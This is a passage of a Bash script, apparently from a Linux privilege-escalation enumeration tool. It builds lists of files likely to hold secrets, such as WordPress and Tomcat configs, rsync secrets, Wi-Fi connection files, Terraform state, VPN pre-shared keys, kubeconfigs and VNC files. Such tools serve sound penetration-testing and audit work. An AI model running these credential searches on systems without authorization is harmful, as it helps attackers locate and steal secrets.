  PSTORAGE_X11=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.Xauthority$" | sort | uniq | head -n 70)
  PSTORAGE_WORDPRESS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "wp-config\.php$" | sort | uniq | head -n 70)
  PSTORAGE_DRUPAL=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/default/settings.php' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "settings\.php$" | sort | uniq | head -n 70)
  PSTORAGE_MOODLE=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E 'moodle/config.php' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "config\.php$" | sort | uniq | head -n 70)
  PSTORAGE_TOMCAT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "tomcat-users\.xml$" | sort | uniq | head -n 70)
  PSTORAGE_MONGO=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mongod.*\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_ROCKETCHAT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}lib|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}systemd|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rocketchat\.service$" | sort | uniq | head -n 70)
  PSTORAGE_SUPERVISORD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "supervisord\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_CESI=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cesi\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_RSYNC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rsyncd\.conf$|rsyncd\.secrets$" | sort | uniq | head -n 70)
  PSTORAGE_RPCD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/init.d/|/sbin/|/usr/share/' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "rpcd$" | sort | uniq | head -n 70)
  PSTORAGE_BITCOIN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "bitcoin\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_HOSTAPD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "hostapd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_WIFI_CONNECTIONS=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "system-connections$" | sort | uniq | head -n 70)
  PSTORAGE_PAM_AUTH=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "pam\.d$" | sort | uniq | head -n 70)
  PSTORAGE_NFS_EXPORTS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "exports$" | sort | uniq | head -n 70)
  PSTORAGE_GLUSTERFS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "glusterfs\.pem$|glusterfs\.ca$|glusterfs\.key$" | sort | uniq | head -n 70)
  PSTORAGE_ANACONDA_KS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "anaconda-ks\.cfg$" | sort | uniq | head -n 70)
  PSTORAGE_TERRAFORM=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.tfstate$|.*\.tf$" | sort | uniq | head -n 70)
  PSTORAGE_RACOON=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "racoon\.conf$|psk\.txt$" | sort | uniq | head -n 70)
  PSTORAGE_KUBERNETES=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kubeconfig$|bootstrap-kubeconfig$|kubelet-kubeconfig$|kubelet\.conf$|psk\.txt$|\.kube.*$|kubelet$|kube-proxy$|kubernetes$" | sort | uniq | head -n 70)
  PSTORAGE_VNC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/mime/' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.vnc$|.*vnc.*\.c.*nf.*$|.*vnc.*\.ini$|.*vnc.*\.txt$|.*vnc.*\.xml$" | sort | uniq | head -n 70)
  PSTORAGE_LDAP=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ldap$" | sort | uniq | head -n 70)
